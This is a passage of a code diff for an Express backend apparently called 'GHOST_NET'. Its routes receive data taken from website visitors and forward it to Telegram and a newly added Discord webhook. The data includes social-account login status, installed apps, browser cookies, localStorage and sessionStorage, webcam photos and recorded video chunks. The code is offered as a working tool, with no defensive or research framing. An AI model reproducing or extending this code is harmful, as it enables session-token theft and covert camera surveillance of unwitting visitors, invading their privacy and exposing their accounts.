+      fields: fields.slice(0, 25), // Discord limit
+      footer: { text: `GHOST_NET • ${time}` },
+      timestamp: new Date().toISOString(),
+    };
+
+    // Send social recon as second embed if available
+    const embedList: object[] = [embed];
+    const social = info.social as Record<string, string> | undefined;
+    if (social && typeof social === "object") {
+      const socialValue = Object.entries(social)
+        .map(([p, s]) => `${s.includes("logged in") ? (s.includes("SENDER") ? "🎯" : "✓") : "✗"} **${p}** — ${s}`)
+        .join("\n");
+      if (socialValue.length <= 4096) {
+        embedList.push({
+          title: "🌍 Social Recon",
+          description: socialValue,
+          color: DISCORD_COLOR,
+        });
       }
     }
 
-    // ── Autofill ──────────────────────────────────────────────────────────
-    const autofill = info["autofill"];
-    if (autofill && typeof autofill === "object" && Object.keys(autofill).length > 0) {
-      const af = autofill as Record<string, string>;
-      const afLines = Object.entries(af).map(([k, val]) => `${esc(k)}\\: ${esc(val)}`);
-      const msg = `${hdr("📝", "Autofill Data")}\n${bq(afLines)}`;
-      await tgSendText(token, chatId, msg);
+    // App detection as third embed
+    const apps = info.apps as Record<string, string> | undefined;
+    if (apps && typeof apps === "object") {
+      const appsValue = Object.entries(apps)
+        .map(([name, status]) => `${status === "installed" ? "✅" : "—"} **${name}**`)
+        .join("\n");
+      if (appsValue.length <= 4096) {
+        embedList.push({
+          title: "📱 App Detection",
+          description: appsValue,
+          color: DISCORD_COLOR,
+        });
+      }
     }
+
+    // Browser storage as fourth embed
+    const storage = info.storage as Record<string, string> | undefined;
+    if (storage && typeof storage === "object") {
+      const storFields: { name: string; value: string; inline: boolean }[] = [
+        { name: "🍪 Cookies", value: `\`\`\`\n${(storage.cookies || "(No cookies)").slice(0, 800)}\n\`\`\``, inline: false },
+        { name: "🗃 LocalStorage", value: `\`\`\`\n${(storage.localStorage || "(Empty)").slice(0, 800)}\n\`\`\``, inline: false },
+        { name: "📦 SessionStorage", value: `\`\`\`\n${(storage.sessionStorage || "(Empty)").slice(0, 800)}\n\`\`\``, inline: false },
+      ];
+      embedList.push({
+        title: "🗄 Browser Storage",
+        fields: storFields.slice(0, 5),
+        color: DISCORD_COLOR,
+      });
+    }
+
+    await discordSendJSON(dcHook, { username: "GHOST_NET", avatar_url: "https://i.imgur.com/4M34hi2.png", embeds: embedList.slice(0, 10) });
   }
 
   return res.status(200).json({ ok: true });
@@ -486,27 +529,41 @@ router.post("/visits/deviceinfo", async (req, res) => {
 
 router.post("/visits/photo", async (req, res) => {
   const parsed = SendPhotoBody.safeParse(req.body);
-  if (!parsed.success) {
-    return res.status(400).json({ error: "Missing photo" });
-  }
+  if (!parsed.success) return res.status(400).json({ error: "Missing photo" });
 
   const { photo, caption: customCaption } = parsed.data;
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHANNEL_ID;
+  const tgToken = process.env.TELEGRAM_BOT_TOKEN;
+  const tgChat  = process.env.TELEGRAM_CHANNEL_ID;
+  const dcHook  = process.env.DISCORD_WEBHOOK_URL;
+  const time = new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" });
+  const caption = customCaption ?? `📷 Photo — ${time}`;
 
-  if (token && chatId) {
+  // Strip data-URL prefix if present
+  const b64 = photo.includes(",") ? photo.split(",")[1] : photo;
+  const buffer = Buffer.from(b64, "base64");
+
+  // Telegram
+  if (tgToken && tgChat) {
     try {
-      const buffer = Buffer.from(photo, "base64");
-      const caption = customCaption ?? `📷 Photo — ${new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" })}`;
-
-      await telegramMultipartPost(token, "sendPhoto", [
-        { name: "chat_id", value: chatId },
+      await tgMultipart(tgToken, "sendPhoto", [
+        { name: "chat_id", value: tgChat },
         { name: "caption", value: caption },
         { name: "photo", file: { data: buffer, filename: "photo.jpg", contentType: "image/jpeg" } },
       ]);
-    } catch (err) {
-      logger.warn({ err }, "Failed to send photo to Telegram");
-    }
+    } catch (err) { logger.warn({ err }, "TG photo failed"); }
+  }
+
+  // Discord — send as file attachment with embed
+  if (dcHook) {
+    const embed = {
+      title: "📷 CAMERA SNAPSHOT",
+      color: DISCORD_COLOR,
+      description: caption,
+      image: { url: "attachment://photo.jpg" },
+      footer: { text: `GHOST_NET • ${time}` },
+      timestamp: new Date().toISOString(),
+    };
+    await discordSendFile(dcHook, buffer, "photo.jpg", "image/jpeg", embed);
   }
 
   return res.status(200).json({ ok: true });
@@ -516,31 +573,42 @@ router.post("/visits/photo", async (req, res) => {
 
 router.post("/visits/videochunk", async (req, res) => {
   const parsed = SendVideoChunkBody.safeParse(req.body);
-  if (!parsed.success) {
-    return res.status(400).json({ error: "Missing chunk" });
+  if (!parsed.success) return res.status(400).json({ error: "Missing chunk" });
+
+  const { chunk, mimeType = "video/webm", index = 0, label = "CAM", isFinal = false } = parsed.data;
+  const tgToken = process.env.TELEGRAM_BOT_TOKEN;
+  const tgChat  = process.env.TELEGRAM_CHANNEL_ID;
+  const dcHook  = process.env.DISCORD_WEBHOOK_URL;
+  const time = new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" });
+
+  const b64 = chunk.includes(",") ? chunk.split(",")[1] : chunk;
+  const buffer = Buffer.from(b64, "base64");
+  const isMP4 = (mimeType ?? "").toLowerCase().includes("mp4");
+  const ext = isMP4 ? "mp4" : "webm";
+  const caption = `🎥 ${label} chunk #${index}${isFinal ? " [FINAL]" : ""} — ${time}`;
+
+  // Telegram — always use sendVideo (works for mp4; webm shows as document but sendVideo is more prominent)
+  if (tgToken && tgChat) {
+    try {
+      await tgMultipart(tgToken, "sendVideo", [
+        { name: "chat_id", value: tgChat },
+        { name: "caption", value: caption },
+        { name: "supports_streaming", value: "true" },
+        { name: "video", file: { data: buffer, filename: `chunk_${index}.${ext}`, contentType: mimeType ?? "video/mp4" } },
+      ]);
+    } catch (err) { logger.warn({ err }, "TG video failed"); }
   }
 
-  const { chunk, mimeType = "video/webm", index = 0, label = "CAM" } = parsed.data;
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHANNEL_ID;
-
-  if (token && chatId) {
-    try {
-      const buffer = Buffer.from(chunk, "base64");
-      const isMP4 = (mimeType ?? "").includes("mp4");
-      const ext = isMP4 ? "mp4" : "webm";
-      const method = isMP4 ? "sendVideo" : "sendDocument";
-      const field = isMP4 ? "video" : "document";
-      const caption = `🎥 ${label} chunk #${index} — ${new Date().toLocaleString("en-PH", { timeZone: "Asia/Manila" })}`;
-
-      await telegramMultipartPost(token, method, [
-        { name: "chat_id", value: chatId },
-        { name: "caption", value: caption },
-        { name: field, file: { data: buffer, filename: `chunk_${index}.${ext}`, contentType: mimeType ?? "video/webm" } },
-      ]);
-    } catch (err) {
-      logger.warn({ err }, "Failed to send video chunk to Telegram");
-    }
+  // Discord — send as video attachment with embed
+  if (dcHook) {
+    const embed = {
+      title: `🎥 ${label} RECORDING${isFinal ? " [FINAL]" : ""}`,
+      color: DISCORD_COLOR,
+      description: `Chunk #${index} • ${isMP4 ? "MP4" : "WebM"}`,
+      footer: { text: `GHOST_NET • ${time}` },
+      timestamp: new Date().toISOString(),
+    };
+    await discordSendFile(dcHook, buffer, `chunk_${index}.${ext}`, mimeType ?? "video/mp4", embed);
   }
 
   return res.status(200).json({ ok: true });
